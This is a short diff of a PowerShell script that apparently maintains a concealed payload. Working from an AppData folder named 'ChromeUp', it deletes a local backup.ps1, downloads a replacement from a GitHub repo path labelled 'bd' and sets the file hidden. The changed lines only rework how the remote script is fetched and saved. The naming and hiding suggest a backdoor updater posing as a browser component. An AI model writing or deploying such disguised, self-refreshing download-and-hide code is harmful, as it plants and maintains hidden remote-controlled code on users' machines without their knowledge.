@@ -28,7 +28,9 @@ cd $env:appdata/ChromeUp/
 remove-item backup.ps1
 
 #download new backup
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1" -OutFile backup.ps1
+$url = "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1"
+$response = Invoke-WebRequest -Uri $url
+$response.Content | Set-Content -Path "backup.ps1"
 
 # Set "Hidden" attribute on the file
 $filePath = Join-Path $env:appdata\ChromeUp "backup.ps1"
